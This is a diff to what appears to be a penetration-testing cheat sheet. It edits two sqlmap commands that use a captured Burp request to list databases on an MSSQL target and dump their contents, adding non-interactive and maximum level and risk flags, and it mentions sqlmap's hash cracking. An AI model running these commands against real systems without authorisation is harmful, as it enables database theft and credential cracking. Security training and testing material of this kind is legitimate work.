@@ -652,10 +652,10 @@ Capture request with Burp Suite by right-clicking on the request, then save as a
 
 Dump database name
 
-    sqlmap -r req --dbms mssql --dbs
+    sqlmap -r req --dbms mssql --dbs --batch [--level 5 --risk 3]
 
 Dump database 
 
-    sqlmap -r req --dbms mssql -D dbname --dump
+    sqlmap -r req --dbms mssql -D dbname --dump --batch [--level 5 --risk 3]
 
 SQLmap can also crack any hashes it detects after it finishes the database dump.
